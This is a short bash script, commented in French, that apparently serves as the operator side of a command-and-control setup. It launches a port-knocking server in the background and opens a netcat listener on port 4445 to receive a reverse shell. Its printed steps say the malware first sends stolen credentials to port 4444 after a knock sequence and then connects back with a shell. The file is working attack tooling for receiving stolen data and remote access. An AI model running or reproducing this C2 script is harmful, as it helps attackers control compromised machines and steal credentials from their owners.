#!/bin/bash
#
# c2_start.sh
# Lance le knock_server en arrière-plan, puis écoute un shell sur 4445.

echo "[C2 Script] Lancement du knock_server..."
./knock_server &
KNOCK_PID=$!

sleep 2
echo "[C2 Script] knock_server (PID: $KNOCK_PID) tourne en tâche de fond."
echo

echo "[C2 Script] On écoute maintenant le reverse shell sur le port 4445..."
echo "--------------------------------------------"
echo " 1) Attends la séquence knocks (5001->5002->5003)."
echo " 2) Le malware enverra d'abord credentials sur 4444 (via knock_server)."
echo " 3) Ensuite, il lancera un reverse shell sur 4445."
echo "--------------------------------------------"
echo

# Ecoute en premier plan sur 4445
nc -lvp 4445

echo
echo "[C2 Script] Session sur le port 4445 terminée."
echo "[C2 Script] On arrête knock_server..."
kill $KNOCK_PID 2>/dev/null

echo "[C2 Script] Fin."

